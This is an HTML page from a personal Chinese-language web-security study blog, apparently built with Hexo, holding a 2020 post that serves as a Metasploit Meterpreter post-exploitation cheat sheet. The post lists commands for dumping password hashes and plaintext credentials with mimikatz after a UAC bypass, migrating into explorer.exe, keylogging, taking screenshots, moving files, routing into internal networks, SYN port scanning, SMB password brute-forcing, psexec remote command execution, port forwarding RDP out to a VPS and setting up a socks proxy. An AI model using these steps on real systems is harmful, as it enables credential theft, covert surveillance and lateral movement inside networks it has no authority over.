@@ -1,0 +1,517 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Pisces","version":"7.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="明文密码和HASH获取 绕过UAC之后，如果目标已经登录过，没有关机或者没有重启后没有用户登录的话，是可以直接从内存里面获取到机器的明文密码。  具体操作 绕过UAC，反弹获得meterpreter以后，首先执行hashdump。 加载模块，load mimikatz 执行wdigest，获取明文密码。如果不行，尝试执行kerberos或者msv命令  进程迁移手动迁移 监听的时候 set exi">
+<meta property="og:type" content="article">
+<meta property="og:title" content="msf之meterpreter">
+<meta property="og:url" content="http://yoursite.com/2020/03/22/msf%E4%B9%8Bmeterpreter/index.html">
+<meta property="og:site_name" content="学习笔记">
+<meta property="og:description" content="明文密码和HASH获取 绕过UAC之后，如果目标已经登录过，没有关机或者没有重启后没有用户登录的话，是可以直接从内存里面获取到机器的明文密码。  具体操作 绕过UAC，反弹获得meterpreter以后，首先执行hashdump。 加载模块，load mimikatz 执行wdigest，获取明文密码。如果不行，尝试执行kerberos或者msv命令  进程迁移手动迁移 监听的时候 set exi">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-03-22T01:58:36.000Z">
+<meta property="article:modified_time" content="2020-03-25T10:15:38.991Z">
+<meta property="article:author" content="nannanshen">
+<meta property="article:tag" content="msf">
+<meta property="article:tag" content="meterpreter">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://yoursite.com/2020/03/22/msf%E4%B9%8Bmeterpreter/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>msf之meterpreter | 学习笔记</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">学习笔记</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">从零开始学习web安全</p>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/22/msf%E4%B9%8Bmeterpreter/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/touxiang.jpg">
+      <meta itemprop="name" content="nannanshen">
+      <meta itemprop="description" content="渗透测试">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="学习笔记">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          msf之meterpreter
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-03-22 09:58:36" itemprop="dateCreated datePublished" datetime="2020-03-22T09:58:36+08:00">2020-03-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-03-25 18:15:38" itemprop="dateModified" datetime="2020-03-25T18:15:38+08:00">2020-03-25</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="明文密码和HASH获取"><a href="#明文密码和HASH获取" class="headerlink" title="明文密码和HASH获取"></a>明文密码和HASH获取</h1><ul>
+<li>绕过UAC之后，如果目标已经登录过，没有关机或者没有重启后没有用户登录的话，是可以直接从内存里面获取到机器的明文密码。</li>
+</ul>
+<h2 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h2><ul>
+<li>绕过UAC，反弹获得meterpreter以后，首先执行hashdump。</li>
+<li>加载模块，load mimikatz</li>
+<li>执行wdigest，获取明文密码。如果不行，尝试执行kerberos或者msv命令</li>
+</ul>
+<h1 id="进程迁移"><a href="#进程迁移" class="headerlink" title="进程迁移"></a>进程迁移</h1><h2 id="手动迁移"><a href="#手动迁移" class="headerlink" title="手动迁移"></a>手动迁移</h2><ul>
+<li>监听的时候 set exitonsession false，exploit -j -z，反弹的时候就不会退出监听。</li>
+<li>sessions查看会话，sessions+id打开会话。</li>
+<li>使用ps命令列出所有进程，getpid查看当前exp进程pid，一般进程都选择迁移到任务管理器进程。</li>
+<li>执行migrate -N explorer.exe。或migrate -P pid。  迁移完成后原进程会自动退出。高权限可以往低权限迁移，低权限不能往高权限迁。</li>
+</ul>
+<h2 id="上线自动迁移"><a href="#上线自动迁移" class="headerlink" title="上线自动迁移"></a>上线自动迁移</h2><ul>
+<li>执行exploit之前设置 set autorunscript migrate - n explorer.exe</li>
+<li>或者执行set AutoRunScript migrate -f，msf会自动选择一个进程进行迁移</li>
+</ul>
+<h1 id="各类操作"><a href="#各类操作" class="headerlink" title="各类操作"></a>各类操作</h1><h2 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h2><ul>
+<li>keyscan_start</li>
+<li>keyscan_dump</li>
+<li>keyboard_send 对目标机器进行键盘输入</li>
+</ul>
+<h2 id="屏幕截图"><a href="#屏幕截图" class="headerlink" title="屏幕截图"></a>屏幕截图</h2><ul>
+<li>screenshot</li>
+</ul>
+<h2 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h2><ul>
+<li>上传：upload /root/xf.php c:\xf.php</li>
+<li>下载： download c:/xf.php /root/1.php</li>
+<li>cat 文件名 查看文件</li>
+<li>edit c:/xf.php 编辑文件</li>
+<li>cd c: / 切换工作目录</li>
+</ul>
+<h2 id="加载语言终端"><a href="#加载语言终端" class="headerlink" title="加载语言终端"></a>加载语言终端</h2><ul>
+<li>load -l 列出能加载的语言终端</li>
+<li>load powershell。加载</li>
+<li>具体操作在官网看看。</li>
+</ul>
+<h1 id="添加路由"><a href="#添加路由" class="headerlink" title="添加路由"></a>添加路由</h1><p>##获取网段</p>
+<ul>
+<li>shell  –&gt;  ipconfig</li>
+<li>run get_local_subnets</li>
+<li>route list</li>
+</ul>
+<h2 id="添加路由-1"><a href="#添加路由-1" class="headerlink" title="添加路由"></a>添加路由</h2><p>把自己的机器添加进目标主机路由才能对内网进行操作</p>
+<ul>
+<li>run autoroute -s 192.168.0.0</li>
+<li>backgroup –&gt; route add 192.168.0.0 255.255.255.0 1</li>
+<li>arp扫描 run arp_scanner -r 192.168.0.0/24</li>
+</ul>
+<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><ul>
+<li>search portscan</li>
+<li>use auxiliary/scanner/portscan/syn  （use 5）</li>
+<li>setg rhost 192.168.0.0/24 (setg设置全局参数)</li>
+<li>set threads 20 </li>
+<li>set rhost Interrupt: use the quit</li>
+<li>set ports 445 </li>
+<li>exploit</li>
+</ul>
+<h1 id="SMB密码爆破"><a href="#SMB密码爆破" class="headerlink" title="SMB密码爆破"></a>SMB密码爆破</h1><ul>
+<li>首先扫描开放了445端口的主机</li>
+<li>use auxiliary/scanner/smb/smb_login</li>
+<li>set smbuser administrator   (set USER_FILE /root/user.dic)</li>
+<li>set smbpass admin  (set USERPASS_FILE /root/pass.dic)</li>
+<li>set rhosts file:/root/host.dic</li>
+<li>exploit</li>
+</ul>
+<h1 id="远程命令执行"><a href="#远程命令执行" class="headerlink" title="远程命令执行"></a>远程命令执行</h1><ul>
+<li>search psxec</li>
+<li>use auxiliary/admin/smb/psexec_command</li>
+<li>set command whoami</li>
+<li>set rhosts 192.168.0.19</li>
+<li>set smbuser administrator</li>
+<li>set smbpass admin</li>
+<li>exploit</li>
+</ul>
+<h1 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h1><ul>
+<li><p>一般应用在无法直接连接某个端口的情况下</p>
+</li>
+<li><p>portfwd add -l 6666 -p 3389 -r 127.0.0.1(也可换成内网其他主机ip)</p>
+<p>将目标机器的3389端口转发到装了msf的vps的6666端口上</p>
+</li>
+<li><p>转发完之后删除  add改成delete</p>
+</li>
+</ul>
+<h1 id="socks代理"><a href="#socks代理" class="headerlink" title="socks代理"></a>socks代理</h1><ul>
+<li>不支持ICMP和ARP协议。</li>
+<li>socks5比socks4a支持的协议更多</li>
+</ul>
+<h2 id="具体操作-1"><a href="#具体操作-1" class="headerlink" title="具体操作"></a>具体操作</h2><ul>
+<li>首先添加路由关联到session上</li>
+<li>search socks</li>
+<li>use auxiliary/server/socks4a</li>
+<li>set STVHOST 127.0.0.1</li>
+<li>set SRVPOST  10808</li>
+<li>exploit</li>
+<li>架设完socks代理以后，使用代理需要结合proxychains</li>
+<li>打开proxychains配置文件把端口改成刚才设置的</li>
+<li>proxychains nmap -Pn -sT 192.168.0.19</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/msf/" rel="tag"># msf</a>
+              <a href="/tags/meterpreter/" rel="tag"># meterpreter</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/03/06/SRC%E5%AE%9E%E6%88%98/" rel="prev" title="SRC实战">
+      <i class="fa fa-chevron-left"></i> SRC实战
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#明文密码和HASH获取"><span class="nav-number">1.</span> <span class="nav-text">明文密码和HASH获取</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#具体操作"><span class="nav-number">1.1.</span> <span class="nav-text">具体操作</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#进程迁移"><span class="nav-number">2.</span> <span class="nav-text">进程迁移</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#手动迁移"><span class="nav-number">2.1.</span> <span class="nav-text">手动迁移</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#上线自动迁移"><span class="nav-number">2.2.</span> <span class="nav-text">上线自动迁移</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#各类操作"><span class="nav-number">3.</span> <span class="nav-text">各类操作</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#键盘记录"><span class="nav-number">3.1.</span> <span class="nav-text">键盘记录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#屏幕截图"><span class="nav-number">3.2.</span> <span class="nav-text">屏幕截图</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#文件操作"><span class="nav-number">3.3.</span> <span class="nav-text">文件操作</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#加载语言终端"><span class="nav-number">3.4.</span> <span class="nav-text">加载语言终端</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#添加路由"><span class="nav-number">4.</span> <span class="nav-text">添加路由</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#添加路由-1"><span class="nav-number">4.1.</span> <span class="nav-text">添加路由</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#端口扫描"><span class="nav-number">5.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SMB密码爆破"><span class="nav-number">6.</span> <span class="nav-text">SMB密码爆破</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#远程命令执行"><span class="nav-number">7.</span> <span class="nav-text">远程命令执行</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#端口转发"><span class="nav-number">8.</span> <span class="nav-text">端口转发</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#socks代理"><span class="nav-number">9.</span> <span class="nav-text">socks代理</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#具体操作-1"><span class="nav-number">9.1.</span> <span class="nav-text">具体操作</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="nannanshen"
+      src="/images/touxiang.jpg">
+  <p class="site-author-name" itemprop="name">nannanshen</p>
+  <div class="site-description" itemprop="description">渗透测试</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">19</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/nannanshen" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;nannanshen" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      友情链接
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://www.dark5.net/" title="https:&#x2F;&#x2F;www.dark5.net&#x2F;" rel="noopener" target="_blank">dark5</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">nannanshen</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v4.2.0
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">主题 – <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.7.1
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
+<!-- 页面点击小红心 ,和看板娘冲突了。-->
+<!--<script type="text/javascript" src="/js/src/clicklove.js"></script>-->
+<!-- 看板娘 -->
+<script src="/live2d-widget/autoload.js"></script>
